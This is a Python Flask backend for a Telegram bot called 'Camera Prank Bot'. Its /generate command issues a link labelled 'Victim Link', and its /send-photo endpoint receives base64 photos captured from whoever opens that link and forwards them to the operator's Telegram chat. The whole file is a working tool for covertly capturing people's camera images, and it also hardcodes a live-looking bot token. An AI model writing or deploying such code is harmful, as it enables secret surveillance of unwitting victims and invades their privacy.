from flask import Flask, request, jsonify
import requests
import base64
from io import BytesIO
import uuid
import os

app = Flask(__name__)

TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"

# Home check
@app.route("/", methods=["GET"])
def home():
    return "✅ Backend Running"

# Telegram webhook
@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        update = request.get_json()

        if not update or "message" not in update:
            return jsonify({"ok": True})

        message = update["message"]
        chat_id = message["chat"]["id"]
        text = message.get("text", "").strip().lower()

        # /start
        if text == "/start":
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": "🎉 Camera Prank Bot Ready!\nUse /generate"
                }
            )

        # /generate
        elif text == "/generate":
            unique_id = str(uuid.uuid4())[:8]
            link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"

            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": f"🔥 Victim Link:\n\n{link}",
                    "reply_markup": {
                        "inline_keyboard": [
                            [{"text": "📸 Open Camera", "url": link}]
                        ]
                    }
                }
            )

        return jsonify({"ok": True})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# Receive photo
@app.route("/send-photo", methods=["POST"])
def send_photo():
    try:
        data = request.get_json()

        chat_id = data.get("chat_id")
        photo_base64 = data.get("photo")
        num = data.get("number", 1)

        if not chat_id or not photo_base64:
            return jsonify({"error": "missing data"}), 400

        # decode base64
        header, imgstr = photo_base64.split(",", 1)
        photo_bytes = base64.b64decode(imgstr)

        files = {
            "photo": ("photo.jpg", BytesIO(photo_bytes), "image/jpeg")
        }

        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={
                "chat_id": chat_id,
                "caption": f"📸 Photo {num}/3 Captured 😂"
            },
            files=files
        )

        return jsonify({"ok": True})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# IMPORTANT for Vercel
app = app
